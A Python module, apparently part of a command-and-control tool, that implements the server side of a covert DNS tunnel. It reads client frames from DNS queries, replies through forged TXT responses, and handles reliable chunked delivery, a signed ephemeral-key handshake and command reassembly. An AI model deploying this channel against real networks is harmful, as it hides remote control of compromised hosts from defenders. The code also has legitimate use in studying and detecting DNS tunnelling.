#!/usr/bin/env python3

# *********************************************************
#
# Description: Server session managing ARQ state, crypto, and frame dispatch.
# Author: Moshe Yifrah
#
# *********************************************************

# --- Modules ---

from __future__ import annotations

import argparse
import asyncio
import sys
import time
from typing import Final, Optional, Tuple
import scapy.all as scapy
from scapy.layers.inet import IP, UDP
from scapy.layers.dns import DNS

from common import cnc_core, cnc_crypto

# --- Constants ---

HANDSHAKE_COOLDOWN_SECS: Final[float] = 5.0

# ==============================================================================

# --- Classes ---

# ==============================================================================


class ServerSession:
    """Manages per-connection state: queues, RX buffer, sockets, crypto."""

    def __init__(self, args: argparse.Namespace, identity_priv_hex: str) -> None:
        """Initialize session state, queues, and L3 socket."""
        self.args = args
        self.identity_priv_hex = identity_priv_hex
        self.inbound_queue: asyncio.Queue[Tuple[int, bytes]] = asyncio.Queue()
        self.outbound_queue: asyncio.Queue[Tuple[bytes, int]] = asyncio.Queue(maxsize=50)
        self.ack_queue: asyncio.Queue[Tuple[int, int]] = asyncio.Queue()
        self.shutdown_event = asyncio.Event()
        self.tx_lock = asyncio.Lock()
        self.l3_socket = scapy.conf.L3socket(iface=args.interface)
        self.rx_buffer = bytearray()
        self.active_rx_transfer_id: Optional[int] = None
        self.expected_rx_seq: int = 1
        self.last_completed_transfer_id: Optional[int] = None
        self.is_waiting_for_ack: bool = False
        self._last_client_eph_pub: Optional[bytes] = None
        self._last_hs_resp_frame: Optional[bytes] = None
        self._client_port: int = 0
        self._last_qname: bytes = b''
        self._last_txid: int = 0
        self._last_hs_time: float = 0.0

    # ==========================================================================

    def close(self) -> None:
        """Destroy session crypto and release the L3 socket."""
        cnc_crypto.destroy_session_crypto()
        try:
            self.l3_socket.close()
        except OSError:
            pass

    # ==========================================================================

    def _send_raw_packet(self, frame_bytes: bytes) -> None:
        """Build a DNS TXT response and send it to the client."""
        pkt = cnc_core.build_dns_response(
            self.args.destination_ip,
            self._client_port,
            self._last_qname,
            frame_bytes,
            txid=self._last_txid,
        )
        self.l3_socket.send(pkt)

    # ==========================================================================

    def _reset_rx_state(self) -> None:
        """Clear RX buffer and reset reassembly counters."""
        self.rx_buffer.clear()
        self.active_rx_transfer_id = None
        self.expected_rx_seq = 1
        self.last_completed_transfer_id = None

    # ==========================================================================

    def send_control_reset(self) -> None:
        """Reset RX state and send a RESET frame to the client."""
        self._reset_rx_state()
        self._send_raw_packet(
            cnc_core.encode_control_frame(cnc_core.OPCODE_RESET)
        )

    # ==========================================================================

    def send_shutdown_handshake(self) -> None:
        """Send SHUTDOWN frame and destroy session crypto."""
        shutdown_frame = cnc_core.encode_control_frame(
            cnc_core.OPCODE_SHUTDOWN
        )
        cnc_crypto.destroy_session_crypto()
        self._last_client_eph_pub = None
        self._last_hs_resp_frame = None
        self._send_raw_packet(shutdown_frame)

    # ==========================================================================

    def send_ack(self, transfer_id: int, seq_id: int) -> None:
        """Send an ACK frame for the given transfer and sequence IDs."""
        self._send_raw_packet(
            cnc_core.encode_control_frame(
                cnc_core.OPCODE_ACK, transfer_id, seq_id
            )
        )

    # ==========================================================================

    async def _tx_arq_retry_loop(
        self, frame: bytes, transfer_id: int, seq_id: int
    ) -> bool:
        """Transmit one DNS response with ARQ retries; True on ACK."""
        loop = asyncio.get_running_loop()
        retry_count = 0
        while retry_count < cnc_core.MAX_RETRANSMIT_ATTEMPTS:
            while not self.ack_queue.empty():
                self.ack_queue.get_nowait()
            cnc_core.start_rtt_timer(is_retransmit=(retry_count > 0))
            self.is_waiting_for_ack = True
            await loop.run_in_executor(None, self._send_raw_packet, frame)
            try:
                ack_tid, ack_seq = await asyncio.wait_for(
                    self.ack_queue.get(),
                    timeout=cnc_core.get_adaptive_timeout(retry_count),
                )
                if ack_tid == transfer_id and ack_seq == seq_id:
                    return True
            except asyncio.TimeoutError:
                retry_count += 1
                print(
                    f"[Server Warning] Block {seq_id} ACK timeout "
                    f"({cnc_core.get_adaptive_timeout(retry_count):.3f}s). "
                    f"Retry {retry_count}/"
                    f"{cnc_core.MAX_RETRANSMIT_ATTEMPTS}",
                    file=sys.stderr,
                )
        return False

    # ==========================================================================

    async def send_response_chunks_reliably(
        self, raw_bytes_payload: bytes, app_opcode: int
    ) -> None:
        """Chunk and deliver each frame to the client via DNS responses."""
        loop = asyncio.get_running_loop()
        transfer_id, frames = cnc_core.prepare_transfer_frames(
            raw_bytes_payload, cnc_core.OPCODE_RES, app_opcode
        )
        total = len(frames)
        verbose = app_opcode != cnc_core.CMD_KEEPALIVE
        if verbose:
            print(
                f"[TX → CLIENT] tid={transfer_id:#010x}  {total} chunk(s)",
                file=sys.stderr,
            )
        async with self.tx_lock:
            for frame_bytes, seq_id in frames:
                if verbose:
                    print(
                        f"[TX → CLIENT] sending chunk {seq_id}/{total}",
                        file=sys.stderr,
                    )
                success = await self._tx_arq_retry_loop(
                    frame_bytes, transfer_id, seq_id
                )
                self.is_waiting_for_ack = False
                if verbose and success:
                    print(
                        f"[TX → CLIENT] chunk {seq_id}/{total}  ACK'd",
                        file=sys.stderr,
                    )
                if not success:
                    print(
                        "[Server Error] Link timeout. Sending reset.",
                        file=sys.stderr,
                    )
                    await loop.run_in_executor(None, self.send_control_reset)
                    return

    # ==========================================================================

    def process_incoming_frame(
        self, packet: scapy.Packet, event_loop: asyncio.AbstractEventLoop
    ) -> None:
        """Filter DNS queries from the client and dispatch verified frames."""
        if not cnc_core.is_valid_dns_query(packet):
            return
        if packet[IP].src != self.args.destination_ip:
            return

        frame_bytes = cnc_core.extract_frame_from_query(packet)
        if frame_bytes is None:
            return

        parsed = cnc_core.decode_and_verify_frame(
            frame_bytes, cnc_core.get_psk()
        )
        if parsed is None:
            parsed = cnc_core.decode_and_verify_frame(
                frame_bytes, cnc_crypto.get_handshake_psk()
            )
            if parsed is None:
                return

        net_op, app_op, flags, tid, seq, chunk_data = parsed
        client_port = packet[UDP].sport
        qname = packet[DNS].qd.qname
        txid = packet[DNS].id

        event_loop.call_soon_threadsafe(
            self._handle_verified_frame_on_loop,
            net_op, app_op, flags, tid, seq, chunk_data,
            client_port, qname, txid,
        )

    # ==========================================================================

    def _handle_inbound_handshake(
        self, chunk_data: bytes, transfer_id: int, seq_id: int
    ) -> None:
        """Derive session key and send HS_RESP from a fresh HS_INIT frame."""
        cnc_crypto.destroy_session_crypto()
        client_eph_pub = chunk_data[8:]
        srv_eph_priv, srv_eph_pub_bytes = cnc_crypto.generate_ephemeral_keypair()
        signature = cnc_crypto.sign_ephemeral_key(
            self.identity_priv_hex, srv_eph_pub_bytes
        )
        resp_payload = b"HS_RESP:" + srv_eph_pub_bytes + signature
        frame = cnc_core.encode_frame(
            resp_payload, cnc_core.OPCODE_RESET, cnc_core.CMD_KEEPALIVE,
            transfer_id, seq_id, True, cnc_core.get_psk(),
        )
        self._last_client_eph_pub = client_eph_pub
        self._last_hs_resp_frame = frame
        self._send_raw_packet(frame)
        cnc_crypto.derive_and_set_session_key(srv_eph_priv, client_eph_pub)
        del srv_eph_priv
        self._reset_rx_state()
        while not self.outbound_queue.empty():
            try:
                self.outbound_queue.get_nowait()
            except asyncio.QueueEmpty:
                break
        print(
            "\n[+] Handshake complete! Ephemeral session key derived.",
            file=sys.stderr,
        )

    # ==========================================================================

    def _handle_verified_frame_on_loop(
        self,
        net_opcode: int, app_opcode: int, flags: int,
        transfer_id: int, seq_id: int, chunk_data: bytes,
        client_port: int, qname: bytes, txid: int,
    ) -> None:
        """Dispatch a verified frame to the appropriate handler."""
        self._client_port = client_port
        self._last_qname = qname
        self._last_txid = txid

        if net_opcode == cnc_core.OPCODE_RESET:
            if chunk_data.startswith(b"HS_INIT:") and len(chunk_data) == 40:
                client_eph_pub = chunk_data[8:]
                if client_eph_pub == self._last_client_eph_pub:
                    if self._last_hs_resp_frame is not None:
                        self._send_raw_packet(self._last_hs_resp_frame)
                else:
                    now = time.monotonic()
                    if now - self._last_hs_time < HANDSHAKE_COOLDOWN_SECS:
                        return
                    self._last_hs_time = now
                    self._handle_inbound_handshake(
                        chunk_data, transfer_id, seq_id
                    )
            else:
                self._reset_rx_state()
        elif net_opcode == cnc_core.OPCODE_ACK:
            cnc_core.update_rtt_measurement()
            self.ack_queue.put_nowait((transfer_id, seq_id))
        elif net_opcode == cnc_core.OPCODE_CMD:
            self._handle_inbound_cmd_state(
                app_opcode, flags, transfer_id, seq_id, chunk_data
            )

    # ==========================================================================

    def _handle_inbound_cmd_state(
        self, app_op: int, flags: int, tid: int, seq: int, chunk: bytes
    ) -> None:
        """Reassemble inbound CMD chunks and enqueue completed payloads."""
        if tid == self.last_completed_transfer_id:
            self.send_ack(tid, seq)
            return
        if self.active_rx_transfer_id != tid:
            if seq != 1:
                return
            self.active_rx_transfer_id = tid
            self.expected_rx_seq = 1
            self.rx_buffer.clear()
        if seq < self.expected_rx_seq:
            self.send_ack(tid, seq)
            return
        if seq == self.expected_rx_seq:
            if len(self.rx_buffer) + len(chunk) > cnc_core.MAX_BUFFER_LIMIT:
                self.send_control_reset()
                return
            self.rx_buffer.extend(chunk)
            self.expected_rx_seq += 1
            self.send_ack(tid, seq)
            if flags & cnc_core.FLAG_EOF:
                payload = bytes(self.rx_buffer)
                self.rx_buffer.clear()
                self.last_completed_transfer_id = tid
                self.active_rx_transfer_id = None
                self.expected_rx_seq = 1
                self.inbound_queue.put_nowait((app_op, payload))
